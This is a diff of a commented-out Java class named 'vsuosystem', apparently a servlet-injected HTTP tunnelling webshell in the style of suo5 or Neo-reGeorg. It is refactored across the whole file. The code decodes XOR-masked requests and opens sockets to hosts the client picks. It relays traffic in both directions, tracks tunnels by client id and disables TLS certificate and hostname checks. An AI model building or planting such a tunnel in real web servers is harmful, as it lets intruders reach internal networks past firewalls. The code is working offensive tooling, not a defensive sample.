@@ -5,23 +5,22 @@
 //import java.nio.ByteBuffer;
 //import java.security.cert.CertificateException;
 //import java.security.cert.X509Certificate;
-//import java.util.Date;
 //import java.util.Enumeration;
 //import java.util.HashMap;
 //
 //public class vsuosystem implements Runnable, HostnameVerifier, X509TrustManager {
-//    private static final HashMap addrs = collectAddr();
+//    public static HashMap addrs = collectAddr();
+//    public static HashMap ctx = new HashMap();
 //
-//    public static InputStream gInStream;
-//    public static OutputStream gOutStream;
+//    InputStream gInStream;
+//    OutputStream gOutStream;
 //
+//    public vsuosystem() {
+//    }
 //
 //    public vsuosystem(InputStream in, OutputStream out) {
-//        gInStream = in;
-//        gOutStream = out;
-//    }
-//    public vsuosystem(){
-//
+//        this.gInStream = in;
+//        this.gOutStream = out;
 //    }
 //
 //    @Override
@@ -59,34 +58,28 @@
 //        return true;
 //    }
 //
-//    public void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
+//    public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
 //        int bufferOffset = 0;
-//        long maxTimeMillis = new Date().getTime() + timeoutMillis;
-//        while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
+//        while (bufferOffset < b.length) {
 //            int readLength = b.length - bufferOffset;
-//            if (is.available() < readLength) {
-//                readLength = is.available();
-//            }
-//            // can alternatively use bufferedReader, guarded by isReady():
 //            int readResult = is.read(b, bufferOffset, readLength);
 //            if (readResult == -1) break;
 //            bufferOffset += readResult;
-//            Thread.sleep(200);
 //        }
 //    }
 //
 //    public void tryFullDuplex(Object request, Object response) throws IOException, InterruptedException {
+//        InputStream in = null;
 //        try {
-//            InputStream in = (InputStream) invokeMethod(request, "getInputStream", new Object[0]);
+//            in = (InputStream) invokeMethod(request, "getInputStream", new Object[0]);
 //            byte[] data = new byte[32];
-//            readInputStreamWithTimeout(in, data, 2000);
+//            readFull(in, data);
 //            OutputStream out = (OutputStream) invokeMethod(response, "getOutputStream", new Object[0]);
 //            out.write(data);
 //            out.flush();
 //        } catch (Exception e) {
-////            e.printStackTrace();
+//            e.printStackTrace();
 //        }
-//
 //    }
 //
 //
@@ -132,6 +125,18 @@
 //                ((bytes[3] & 0xFF) << 0);
 //    }
 //
+//    synchronized void put(String k, Object v) {
+//        ctx.put(k, v);
+//    }
+//
+//    synchronized Object get(String k) {
+//        return ctx.get(k);
+//    }
+//
+//    synchronized Object remove(String k) {
+//        return ctx.remove(k);
+//    }
+//
 //    byte[] copyOfRange(byte[] original, int from, int to) {
 //        int newLength = to - from;
 //        if (newLength < 0) {
@@ -174,9 +179,8 @@
 //    }
 //
 //    private HashMap unmarshal(InputStream in) throws Exception {
-//        DataInputStream reader = new DataInputStream(in);
 //        byte[] header = new byte[4 + 1]; // size and datatype
-//        reader.readFully(header);
+//        readFull(in, header);
 //        // read full
 //        ByteBuffer bb = ByteBuffer.wrap(header);
 //        int len = bb.getInt();
@@ -185,7 +189,7 @@
 //            throw new IOException("invalid len");
 //        }
 //        byte[] bs = new byte[len];
-//        reader.readFully(bs);
+//        readFull(in, bs);
 //        for (int i = 0; i < bs.length; i++) {
 //            bs[i] = (byte) (bs[i] ^ x);
 //        }
@@ -227,25 +231,30 @@
 //
 //    private void processDataBio(Object request, Object resp) throws Exception {
 //        final InputStream reqInputStream = (InputStream) invokeMethod(request, "getInputStream", new Object[0]);
-//        final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
-//        HashMap dataMap;
-//        dataMap = unmarshal(reqReader);
+//        HashMap dataMap = unmarshal(reqInputStream);
 //
 //        byte[] action = (byte[]) dataMap.get("ac");
 //        if (action.length != 1 || action[0] != 0x00) {
 //            invokeMethod(resp, "setStatus", new Object[]{403});
 //            return;
 //        }
-//        invokeMethod(resp, "setBufferSize", new Object[]{8 * 1024});
+//        invokeMethod(resp, "setBufferSize", new Object[]{512});
 //        final OutputStream respOutStream = (OutputStream) invokeMethod(resp, "getOutputStream", new Object[0]);
 //
 //        // 0x00 create socket
 //        invokeMethod(resp, "setHeader", new Object[]{"X-Accel-Buffering", "no"});
-//
-//        String host = new String((byte[]) dataMap.get("h"));
-//        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
 //        Socket sc;
 //        try {
+//            String host = new String((byte[]) dataMap.get("h"));
+//            int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
+//            if (port == 0) {
+//                try {
+//                    // Cannot convert Integer to int
+//                    port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+//                } catch (Exception e) {
+//                    port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+//                }
+//            }
 //            sc = new Socket();
 //            sc.connect(new InetSocketAddress(host, port), 5000);
 //        } catch (Exception e) {
@@ -257,6 +266,7 @@
 //
 //        respOutStream.write(marshal(newStatus((byte) 0x00)));
 //        respOutStream.flush();
+//        invokeMethod(resp, "flushBuffer", new Object[0]);
 //
 //        final OutputStream scOutStream = sc.getOutputStream();
 //        final InputStream scInStream = sc.getInputStream();
@@ -266,7 +276,7 @@
 //            vsuosystem p = new vsuosystem(scInStream, respOutStream);
 //            t = new Thread(p);
 //            t.start();
-//            readReq(reqReader, scOutStream);
+//            readReq(reqInputStream, scOutStream);
 //        } catch (Exception e) {
 ////                System.out.printf("pipe error, %s\n", e);
 //        } finally {
@@ -280,7 +290,6 @@
 //
 //    private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
 //        byte[] readBuf = new byte[1024 * 8];
-//
 //        while (true) {
 //            int n = inputStream.read(readBuf);
 //            if (n <= 0) {
@@ -295,25 +304,26 @@
 //        }
 //    }
 //
-//    private void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
+//    private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
 //        while (true) {
 //            HashMap dataMap;
 //            dataMap = unmarshal(bufInputStream);
 //
-//            byte[] action = (byte[]) dataMap.get("ac");
-//            if (action.length != 1) {
+//            byte[] actions = (byte[]) dataMap.get("ac");
+//            if (actions.length != 1) {
 //                return;
 //            }
-//            if (action[0] == 0x02) {
+//            byte action = actions[0];
+//            if (action == 0x02) {
 //                socketOutStream.close();
 //                return;
-//            } else if (action[0] == 0x01) {
+//            } else if (action == 0x01) {
 //                byte[] data = (byte[]) dataMap.get("dt");
 //                if (data.length != 0) {
 //                    socketOutStream.write(data);
 //                    socketOutStream.flush();
 //                }
-//            } else if (action[0] == 0x03) {
+//            } else if (action == 0x03) {
 //                continue;
 //            } else {
 //                return;
@@ -329,8 +339,8 @@
 //
 //
 //        String clientId = new String((byte[]) dataMap.get("id"));
-//        byte[] action = (byte[]) dataMap.get("ac");
-//        if (action.length != 1) {
+//        byte[] actions = (byte[]) dataMap.get("ac");
+//        if (actions.length != 1) {
 //            invokeMethod(resp, "setStatus", new Object[]{403});
 //            return;
 //        }
@@ -340,6 +350,7 @@
 //                ActionDelete    byte = 0x02
 //                ActionHeartbeat byte = 0x03
 //             */
+//        byte action = actions[0];
 //        byte[] redirectData = (byte[]) dataMap.get("r");
 //        boolean needRedirect = redirectData != null && redirectData.length > 0;
 //        String redirectUrl = "";
@@ -350,33 +361,29 @@
 //        }
 //        // load balance, send request with data to request url
 //        // action 0x00 need to pipe, see below
-//        if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
+//        if (needRedirect && action >= 0x01 && action <= 0x03) {
 //            HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
 //            conn.disconnect();
 //            return;
 //        }
 //
-//        invokeMethod(resp, "setBufferSize", new Object[]{8 * 1024});
+//        invokeMethod(resp, "setBufferSize", new Object[]{512});
 //        OutputStream respOutStream = (OutputStream) invokeMethod(resp, "getOutputStream", new Object[0]);
-//        if (action[0] == 0x02) {
-//
-//            java.lang.reflect.Method getAttribute = invokeMethod(request,"getServletContext",new Object[0]).getClass().getDeclaredMethod("getAttribute", String.class);
-//            Object obj = getAttribute.invoke(invokeMethod(request,"getServletContext",new Object[0]), clientId);
-//            OutputStream scOutStream = (OutputStream) obj;
-//            if (scOutStream != null) {
-//                scOutStream.close();
-//            }
+//        if (action == 0x02) {
+//            Object o = this.get(clientId);
+//            if (o == null) return;
+//            OutputStream scOutStream = (OutputStream) o;
+//            scOutStream.close();
 //            return;
-//        } else if (action[0] == 0x01) {
-//            java.lang.reflect.Method getAttribute = invokeMethod(request,"getServletContext",new Object[0]).getClass().getDeclaredMethod("getAttribute", String.class);
-//            Object obj = getAttribute.invoke(invokeMethod(request,"getServletContext",new Object[0]), clientId);
-//            OutputStream scOutStream = (OutputStream) obj;
-//            if (scOutStream == null) {
+//        } else if (action == 0x01) {
+//            Object o = this.get(clientId);
+//            if (o == null) {
 //                respOutStream.write(marshal(newDel()));
 //                respOutStream.flush();
 //                respOutStream.close();
 //                return;
 //            }
+//            OutputStream scOutStream = (OutputStream) o;
 //            byte[] data = (byte[]) dataMap.get("dt");
 //            if (data.length != 0) {
 //                scOutStream.write(data);
@@ -387,13 +394,20 @@
 //        } else {
 //        }
 //
-//        if (action[0] != 0x00) {
+//        if (action != 0x00) {
 //            return;
 //        }
 //        // 0x00 create new tunnel
 //        invokeMethod(resp, "setHeader", new Object[]{"X-Accel-Buffering", "no"});
 //        String host = new String((byte[]) dataMap.get("h"));
 //        int port = Integer.parseInt(new String((byte[]) dataMap.get("p")));
+//        if (port == 0) {
+//            try {
+//                port = ((Integer) request.getClass().getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+//            } catch (Exception e) {
+//                port = ((Integer) request.getClass().getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
+//            }
+//        }
 //
 //        InputStream readFrom;
 //        Socket sc = null;
@@ -409,25 +423,24 @@
 //                sc = new Socket();
 //                sc.connect(new InetSocketAddress(host, port), 5000);
 //                readFrom = sc.getInputStream();
-//
-//                java.lang.reflect.Method setAttribute = invokeMethod(request,"getServletContext",new Object[0]).getClass().getDeclaredMethod("setAttribute", String.class,Object.class);
-//                setAttribute.invoke(invokeMethod(request,"getServletContext",new Object[0]), clientId, sc.getOutputStream());
+//                this.put(clientId, sc.getOutputStream());
 //                respOutStream.write(marshal(newStatus((byte) 0x00)));
 //                respOutStream.flush();
+//                invokeMethod(resp, "flushBuffer", new Object[0]);
 //            } catch (Exception e) {
-//                java.lang.reflect.Method removeAttribute = invokeMethod(request,"getServletContext",new Object[0]).getClass().getDeclaredMethod("removeAttribute", String.class);
-//                removeAttribute.invoke(invokeMethod(request,"getServletContext",new Object[0]), clientId);
+////                    System.out.printf("connect error %s\n", e);
+////                    e.printStackTrace();
+//                this.remove(clientId);
 //                respOutStream.write(marshal(newStatus((byte) 0x01)));
 //                respOutStream.flush();
 //                respOutStream.close();
 //                return;
 //            }
 //        }
-//
 //        try {
 //            readSocket(readFrom, respOutStream, !needRedirect);
 //        } catch (Exception e) {
-////                System.out.printf("pipe error, %s\n", e);
+////                System.out.println("socket error " + e.toString());
 ////                e.printStackTrace();
 //        } finally {
 //            if (sc != null) {
@@ -437,8 +450,7 @@
 //                conn.disconnect();
 //            }
 //            respOutStream.close();
-//            java.lang.reflect.Method removeAttribute = invokeMethod(request,"getServletContext",new Object[0]).getClass().getDeclaredMethod("removeAttribute", String.class);
-//            removeAttribute.invoke(invokeMethod(request,"getServletContext",new Object[0]), clientId);
+//            this.remove(clientId);
 //        }
 //    }
 //
@@ -502,10 +514,10 @@
 //        // ignore ssl verify
 //        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
 //        if (HttpsURLConnection.class.isInstance(conn)) {
-//            ((HttpsURLConnection) conn).setHostnameVerifier(new vsuosystem());
-//            SSLContext ctx = SSLContext.getInstance("SSL");
-//            ctx.init(null, new TrustManager[]{new vsuosystem()}, null);
-//            ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
+//            ((HttpsURLConnection) conn).setHostnameVerifier(this);
+//            SSLContext sslCtx = SSLContext.getInstance("SSL");
+//            sslCtx.init(null, new TrustManager[]{this}, null);
+//            ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
 //        }
 //
 //        Enumeration headers = (Enumeration) invokeMethod(request, "getHeaderNames", new Object[0]);
